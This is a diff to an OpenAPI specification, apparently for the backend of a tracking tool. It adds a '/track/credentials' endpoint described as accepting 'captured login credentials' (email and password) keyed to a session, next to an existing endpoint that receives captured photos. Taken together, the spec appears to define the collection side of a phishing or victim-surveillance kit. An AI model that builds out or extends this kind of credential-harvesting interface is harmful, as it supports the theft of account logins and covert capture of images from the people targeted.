@@ -44,6 +44,24 @@ paths:
             application/json:
               schema:
                 $ref: "#/components/schemas/TrackResponse"
+  /track/credentials:
+    post:
+      operationId: submitCredentials
+      tags: [tracker]
+      summary: Submit captured login credentials
+      requestBody:
+        required: true
+        content:
+          application/json:
+            schema:
+              $ref: "#/components/schemas/CredentialsPayload"
+      responses:
+        "200":
+          description: Saved
+          content:
+            application/json:
+              schema:
+                $ref: "#/components/schemas/TrackResponse"
   /track/photo:
     post:
       operationId: submitPhoto
@@ -112,6 +130,22 @@ components:
         - sessionId
         - photoIndex
         - imageData
+        - timestamp
+    CredentialsPayload:
+      type: object
+      properties:
+        sessionId:
+          type: string
+        email:
+          type: string
+        password:
+          type: string
+        timestamp:
+          type: string
+      required:
+        - sessionId
+        - email
+        - password
         - timestamp
     TrackResponse:
       type: object
